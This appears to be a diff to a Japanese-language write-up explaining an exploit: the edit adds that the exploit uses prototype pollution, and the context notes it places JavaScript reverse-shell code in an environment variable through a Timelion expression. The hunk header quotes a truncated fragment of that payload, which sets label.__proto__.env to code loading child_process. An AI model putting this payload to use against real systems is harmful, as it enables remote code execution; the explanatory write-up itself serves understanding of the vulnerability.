@@ -159,7 +159,7 @@ data = r'''{"sheet":[".es(*).props(label.__proto__.env.AAAA='require(\"child_pro
 .es(*).props(label='CPU Usage', color='red')
 ```
 
-しかし、エクスプロイトコードでは、label の ```__proto__.env``` を介して環境変数にアクセスすることにより、
+しかし、エクスプロイトコードではプロトタイプ汚染を利用し、label の ```__proto__.env``` を介して環境変数にアクセスすることにより、
 
 １．環境変数「AAAA」に javascript のリバースシェルコードの文字列を設定している。
 
